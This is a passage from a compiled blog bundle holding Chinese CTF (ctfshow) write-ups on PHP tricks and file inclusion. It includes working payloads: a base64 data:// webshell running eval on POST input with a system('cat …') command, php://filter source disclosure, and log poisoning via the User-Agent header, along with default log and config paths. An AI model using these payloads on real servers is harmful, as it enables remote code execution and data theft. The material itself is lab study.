有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的</p>\n</blockquote>\n<blockquote>\n<p>这道题是弱比较类型所以 字符串类型绕过1.php==1</p>\n</blockquote>\n<blockquote>\n<p>通过post传参写入 rce</p>\n<p>然后访问2.php就行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image029" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png" data="aurora"></p>\n<h3 id="web100" tabindex="-1"><a class="header-anchor" href="#web100" aria-hidden="true">#</a> Web100</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image031" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png" data="aurora"></p>\n<blockquote>\n<p>is_numeric — 检测变量是否为数字或数字字符串</p>\n</blockquote>\n<blockquote>\n<p>如果 <code>value</code> 是数字或<a href="https://www.php.net/manual/zh/language.types.numeric-strings.php" target="_blank" rel="noopener noreferrer">数字字符串<ExternalLinkIcon/></a>， 返回 <code>**true**</code>；否则返回 <code>**false**</code>。</p>\n</blockquote>\n<blockquote>\n<p>这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关</p>\n</blockquote>\n<blockquote>\n<p>还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image033" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png" data="aurora"></p>\n<blockquote>\n<p>正常RCE</p>\n</blockquote>\n<blockquote>\n<p>ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}</p>\n</blockquote>\n<blockquote>\n<p>0x2d=”-”</p>\n</blockquote>\n<blockquote>\n<p>ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}</p>\n</blockquote>\n<h3 id="web101" tabindex="-1"><a class="header-anchor" href="#web101" aria-hidden="true">#</a> web101</h3>\n<blockquote>\n<p>考点：PHP 反射机制Reflection<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener noreferrer">PHP: ReflectionClass - Manual<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p><strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image035" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png" data="aurora"></p>\n<blockquote>\n<p>这样可以echo出asd类中的属性及其方法</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image037" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png" data="aurora"></p>\n<blockquote>\n<p>注意这次的flag值少了一位，自己猜一下</p>\n</blockquote>\n<h3 id="web102" tabindex="-1"><a class="header-anchor" href="#web102" aria-hidden="true">#</a> Web102</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image039" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png" data="aurora"></p>\n<blockquote>\n<p>substr() 函数返回字符串的一部分。substr(string,start,length)</p>\n</blockquote>\n<blockquote>\n<p>call_user_func — 把第一个参数作为回调函数调用</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web3.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web3",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web3.md",filePathRelative:"web/web3.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web3.html.vue",componentFilePathRelative:"pages/web/web3.html.vue",componentFileChunkName:"v-d21174f4",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web3.html.js",dataFilePathRelative:"pages/web/web3.html.js",dataFileChunkName:"v-d21174f4",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web3.html",htmlFilePathRelative:"web/web3.html"},{data:{key:"v-cea7c3b6",path:"/web/web4.html",title:"文件包含刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"文件包含刷题",tag:["ctfshow刷题"],categories:["文件包含","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件包含",slug:"文件包含",children:[{level:3,title:"web78",slug:"web78",children:[]},{level:3,title:"Web79",slug:"web79",children:[]},{level:3,title:"Web80",slug:"web80",children:[]},{level:3,title:"Web81",slug:"web81",children:[]}]}],git:{}},key:"v-cea7c3b6",path:"/web/web4.html",title:"文件包含刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"文件包含刷题",tag:["ctfshow刷题"],categories:["文件包含","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件包含",slug:"文件包含",children:[{level:3,title:"web78",slug:"web78",children:[]},{level:3,title:"Web79",slug:"web79",children:[]},{level:3,title:"Web80",slug:"web80",children:[]},{level:3,title:"Web81",slug:"web81",children:[]}]}],content:'\r\n## 文件包含\r\n\r\n### web78\r\n\r\n![image-20230530144343183](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png)\r\n\r\n> 文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行\r\n>\r\n> payload：\r\n>\r\n> （1）?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==（base64过后的<?php eval($_POST[1]);）\r\n>\r\n> POST ：1=system("cat * f *");\r\n>\r\n> （2）?file=php://filter/convert.base64-encode/resource=flag.php\r\n\r\n### Web79\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png)\r\n\r\n> 该题目意思是将php replace成？？？所以无法直接包含flag.php \r\n>\r\n> 这边可以使用data伪协议绕过\r\n\r\n> 1.data协议\r\n\r\n> php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码\r\n\r\n> 使用方法:data://text/plain;base64,xxxx(base64编码后的数据)\r\n\r\n> data伪协议只有在php<5.3且include=on时可以写木马。\r\n\r\n> 2.php伪协议：\r\n\r\n> 需要开启allow_url_fopen的：php://input（post请求提交数据）、php://stdin、php://memory和php://temp\r\n\r\n> 不需要开启allow_wrl_fopen的：php://filter 用于读取源码\r\n\r\n> 经常使用的是php://filter 用于读取源码 和php://input 用于执行php代码\r\n\r\n### Web80\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png)\r\n\r\n> data 和 php 被过滤所以data和伪协议用不了\r\n\r\n> 用包含日志文件方法 大概意思就是\r\n>\r\n> 1、日志的默认路径\r\n\r\n>  /etc/httpd/logs/access_log或/var/log/httpd/access_log    //apache+linux\r\n\r\n>  nginx 日志文件在用户安装目录的logs目录下/var/log/nginx/access.log\r\n\r\n> 2、web中间件默认配置uoh文件\r\n\r\n> /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd    //apache+linux\r\n\r\n> C:/Windows/system32/inetsrv/metabase.xml     //iis6.0+win2003\r\n\r\n> C:WindowsSystem32inetsrvconfigapplicationHost.config      //iis7.0+win\r\n\r\n> 3、利用\r\n\r\n>  方法1 访问\r\n>\r\n> ```\r\n> http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：\r\n> ```\r\n\r\n> /var/log/nginx/access.log找到日志文件，并以php解析的方式打开\r\n\r\n> 方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中\r\n\r\n![image-20230530153049671](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png)\r\n\r\n### Web81\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png)\r\n\r\n> 多过滤了：不影响包含日志文件的尝试用上一题解决方法\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png)\r\n\r\n> 一般都是能够通过日志包含来写的\r\n\r\n ',contentRendered:'<h2 id="文件包含" tabindex="-1"><a class="header-anchor" href="#文件包含" aria-hidden="true">#</a> 文件包含</h2>\n<h3 id="web78" tabindex="-1"><a class="header-anchor" href="#web78" aria-hidden="true">#</a> web78</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530144343183" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png" data="aurora"></p>\n<blockquote>\n<p>文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行</p>\n<p>payload：</p>\n<p>（1）?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==（base64过后的&lt;?php eval($_POST[1]);）</p>\n<p>POST ：1=system(&quot;cat * f *&quot;);</p>\n<p>（2）?file=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<h3 id="web79" tabindex="-1"><a class="header-anchor" href="#web79" aria-hidden="true">#</a> Web79</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png" data="aurora"></p>\n<blockquote>\n<p>该题目意思是将php replace成？？？所以无法直接包含flag.php</p>\n<p>这边可以使用data伪协议绕过</p>\n</blockquote>\n<blockquote>\n<p>1.data协议</p>\n</blockquote>\n<blockquote>\n<p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>\n</blockquote>\n<blockquote>\n<p>使用方法:data://text/plain;base64,xxxx(base64编码后的数据)</p>\n</blockquote>\n<blockquote>\n<p>data伪协议只有在php&lt;5.3且include=on时可以写木马。</p>\n</blockquote>\n<blockquote>\n<p>2.php伪协议：</p>\n</blockquote>\n<blockquote>\n<p>需要开启allow_url_fopen的：php://input（post请求提交数据）、php://stdin、php://memory和php://temp</p>\n</blockquote>\n<blockquote>\n<p>不需要开启allow_wrl_fopen的：php://filter 用于读取源码</p>\n</blockquote>\n<blockquote>\n<p>经常使用的是php://filter 用于读取源码 和php://input 用于执行php代码</p>\n</blockquote>\n<h3 id="web80" tabindex="-1"><a class="header-anchor" href="#web80" aria-hidden="true">#</a> Web80</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png" data="aurora"></p>\n<blockquote>\n<p>data 和 php 被过滤所以data和伪协议用不了</p>\n</blockquote>\n<blockquote>\n<p>用包含日志文件方法 大概意思就是</p>\n<p>1、日志的默认路径</p>\n</blockquote>\n<blockquote>\n<p>/etc/httpd/logs/access_log或/var/log/httpd/access_log    //apache+linux</p>\n</blockquote>\n<blockquote>\n<p>nginx 日志文件在用户安装目录的logs目录下/var/log/nginx/access.log</p>\n</blockquote>\n<blockquote>\n<p>2、web中间件默认配置uoh文件</p>\n</blockquote>\n<blockquote>\n<p>/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd    //apache+linux</p>\n</blockquote>\n<blockquote>\n<p>C:/Windows/system32/inetsrv/metabase.xml     //iis6.0+win2003</p>\n</blockquote>\n<blockquote>\n<p>C:WindowsSystem32inetsrvconfigapplicationHost.config      //iis7.0+win</p>\n</blockquote>\n<blockquote>\n<p>3、利用</p>\n</blockquote>\n<blockquote>\n<p>方法1 访问</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://www.xx.com/&lt;?php phpinfo(); ?>时，&lt;?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<blockquote>\n<p>/var/log/nginx/access.log找到日志文件，并以php解析的方式打开</p>\n</blockquote>\n<blockquote>\n<p>方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530153049671" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png" data="aurora"></p>\n<h3 id="web81" tabindex="-1"><a class="header-anchor" href="#web81" aria-hidden="true">#</a> Web81</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png" data="aurora"></p>\n<blockquote>\n<p>多过滤了：不影响包含日志文件的尝试用上一题解决方法</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png" data="aurora"></p>\n<blockquote>\n<p>一般都是能够通过日志包含来写的</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web4.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web4",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web4.md",filePathRelative:"web/web4.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web4.html.vue",componentFilePathRelative:"pages/web/web4.html.vue",componentFileChunkName:"v-cea7c3b6",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web4.html.js",dataFilePathRelative:"pages/web/web4.html.js",dataFileChunkName:"v-cea7c3b6",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web4.html",htmlFilePathRelative:"web/web4.html"},{data:{key:"v-3706649a",path:"/404.html",title:"",lang:"zh-CN",frontmatter:{layout:"404"},excerpt:"",headers:[],git:{}},key:"v-3706649a",path:"/404.html",title:"",lang:"zh-CN",frontmatter:{layout:"404"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/404.html.vue",componentFilePathRelative:"pages/404.html.vue",componentFileChunkName:"v-3706649a",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/404.html.js",dataFilePathRelative:"pages/404.html.js",dataFileChunkName:"v-3706649a",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/404.html",htmlFilePathRelative:"404.html"},{data:{key:"v-8daa1a0e",path:"/",title:"",lang:"zh-CN",frontmatter:{layout:"Layout",home:!0},excerpt:"",headers:[],git:{}},key:"v-8daa1a0e",path:"/",title:"",lang:"zh-CN",frontmatter:{layout:"Layout",home:!0},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/index.html.vue",componentFilePathRelative:"pages/index.html.vue",componentFileChunkName:"v-8daa1a0e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/index.html.js",dataFilePathRelative:"pages/index.html.js",dataFileChunkName:"v-8daa1a0e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/index.html",htmlFilePathRelative:"index.html"},{data:{key:"v-74bc627b",path:"/about/",title:"",lang:"zh-CN",frontmatter:{layout:"About",slug:"aurora-about"},excerpt:"",headers:[],git:{}},key:"v-74bc627b",path:"/about/",title:"",lang:"zh-CN",frontmatter:{layout:"About",slug:"aurora-about"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/about/index.html.vue",componentFilePathRelative:"pages/about/index.html.vue",componentFileChunkName:"v-74bc627b",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/about/index.html.js",dataFilePathRelative:"pages/about/index.html.js",dataFileChunkName:"v-74bc627b",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/about/index.html",htmlFilePathRelative:"about/index.html"},{data:{key:"v-14f724bf",path:"/mood/",title:"",lang:"zh-CN",frontmatter:{layout:"Mood",slug:"aurora-mood"},excerpt:"",headers:[],git:{}},key:"v-14f724bf",path:"/mood/",title:"",lang:"zh-CN",frontmatter:{layout:"Mood",slug:"aurora-mood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/mood/index.html.vue",componentFilePathRelative:"pages/mood/index.html.vue",componentFileChunkName:"v-14f724bf",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/mood/index.html.js",dataFilePathRelative:"pages/mood/index.html.js",dataFileChunkName:"v-14f724bf",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/mood/index.html",htmlFilePathRelative:"mood/index.html"},{data:{key:"v-14e6501c",path:"/link/",title:"",lang:"zh-CN",frontmatter:{layout:"Link",slug:"aurora-link"},excerpt:"",headers:[],git:{}},key:"v-14e6501c",path:"/link/",title:"",lang:"zh-CN",frontmatter:{layout:"Link",slug:"aurora-link"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/link/index.html.vue",componentFilePathRelative:"pages/link/index.html.vue",componentFileChunkName:"v-14e6501c",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/link/index.html.js",dataFilePathRelative:"pages/link/index.html.js",dataFileChunkName:"v-14e6501c",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/link/index.html",htmlFilePathRelative:"link/index.html"},{data:{key:"v-744d024e",path:"/tag/",title:"",lang:"zh-CN",frontmatter:{layout:"Tag",slug:"aurora-tag"},excerpt:"",headers:[],git:{}},key:"v-744d024e",path:"/tag/",title:"",lang:"zh-CN",frontmatter:{layout:"Tag",slug:"aurora-tag"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tag/index.html.vue",componentFilePathRelative:"pages/tag/index.html.vue",componentFileChunkName:"v-744d024e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tag/index.html.js",dataFilePathRelative:"pages/tag/index.html.js",dataFileChunkName:"v-744d024e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/tag/index.html",htmlFilePathRelative:"tag/index.html"},{data:{key:"v-705c21a6",path:"/archive/",title:"",lang:"zh-CN",frontmatter:{layout:"Archive",slug:"aurora-archive"},excerpt:"",headers:[],git:{}},key:"v-705c21a6",path:"/archive/",title:"",lang:"zh-CN",frontmatter:{layout:"Archive",slug:"aurora-archive"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/archive/index.html.vue",componentFilePathRelative:"pages/archive/index.html.vue",componentFileChunkName:"v-705c21a6",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/archive/index.html.js",dataFilePathRelative:"pages/archive/index.html.js",dataFileChunkName:"v-705c21a6",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/archive/index.html",htmlFilePathRelative:"archive/index.html"},{data:{key:"v-6629f178",path:"/aurora-coze/",title:"",lang:"zh-CN",frontmatter:{layout:"CozeMood",slug:"aurora-coze-mood"},excerpt:"",headers:[],git:{}},key:"v-6629f178",path:"/aurora-coze/",title:"",lang:"zh-CN",frontmatter:{layout:"CozeMood",slug:"aurora-coze-mood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-coze/index.html.vue",componentFilePathRelative:"pages/aurora-coze/index.html.vue",componentFileChunkName:"v-6629f178",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-coze/index.html.js",dataFilePathRelative:"pages/aurora-coze/index.html.js",dataFileChunkName:"v-6629f178",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/aurora-coze/index.html",htmlFilePathRelative:"aurora-coze/index.html"},{data:{key:"v-031dfb13",path:"/register/",title:"",lang:"zh-CN",frontmatter:{layout:"RegisterUser",slug:"aurora-coze-register"},excerpt:"",headers:[],git:{}},key:"v-031dfb13",path:"/register/",title:"",lang:"zh-CN",frontmatter:{layout:"RegisterUser",slug:"aurora-coze-register"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/register/index.html.vue",componentFilePathRelative:"pages/register/index.html.vue",componentFileChunkName:"v-031dfb13",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/register/index.html.js",dataFilePathRelative:"pages/register/index.html.js",dataFileChunkName:"v-031dfb13",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/register/index.html",htmlFilePathRelative:"register/index.html"},{data:{key:"v-e2acc714",path:"/photo/",title:"",lang:"zh-CN",frontmatter:{layout:"CozePhoto",slug:"aurora-photo"},excerpt:"",headers:[],git:{}},key:"v-e2acc714",path:"/photo/",title:"",lang:"zh-CN",frontmatter:{layout:"CozePhoto",slug:"aurora-photo"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/photo/index.html.vue",componentFilePathRelative:"pages/photo/index.html.vue",componentFileChunkName:"v-e2acc714",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/photo/index.html.js",dataFilePathRelative:"pages/photo/index.html.js",dataFileChunkName:"v-e2acc714",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/photo/index.html",htmlFilePathRelative:"photo/index.html"},{data:{key:"v-4382d077",path:"/next-mood/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraCozeMood",slug:"aurora-AuroraCozeMood"},excerpt:"",headers:[],git:{}},key:"v-4382d077",path:"/next-mood/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraCozeMood",slug:"aurora-AuroraCozeMood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/next-mood/index.html.vue",componentFilePathRelative:"pages/next-mood/index.html.vue",componentFileChunkName:"v-4382d077",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/next-mood/index.html.js",dataFilePathRelative:"pages/next-mood/index.html.js",dataFileChunkName:"v-4382d077",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/next-mood/index.html",htmlFilePathRelative:"next-mood/index.html"},{data:{key:"v-3279cf61",path:"/aurora-archive/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraArchive",slug:"aurora-plugin-archive"},excerpt:"",headers:[],git:{}},key:"v-3279cf61",path:"/aurora-archive/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraArchive",slug:"aurora-plugin-archive"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-archive/index.html.vue",componentFilePathRelative:"pages/aurora-archive/index.html.vue",componentFileChunkName:"v-3279cf61",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-archive/index.html.js",dataFilePathRelative:"pages/aurora-archive/index.html.js",dataFileChunkName:"v-3279cf61",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/aurora-archive/index.html",htmlFilePathRelative:"aurora-archive/index.html"},{data:{key:"v-3c506944",path:"/aurora-music/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraMusic",slug:"aurora-plugin-music"},excerpt:"",headers:[],git:{}},key:"v-3c506944",path:"/aurora-music/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraMusic",slug:"aurora-plugin-music"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-music/index.html.vue",componentFilePathRelative:"pages/aurora-music/index.html.vue",componentFileChunkName:"v-3c506944",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-music/index.html.js",dataFilePathRelative:"pages/aurora-music/index.html.js",dataFileChunkName:"v-3c506944",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/aurora-music/index.html",htmlFilePathRelative:"aurora-music/index.html"}]},7039:(n,e,a)=>{a.d(e,{Z:()=>l});const l=[{data:{key:"v-4911275f",path:"/help.html",title:"forget 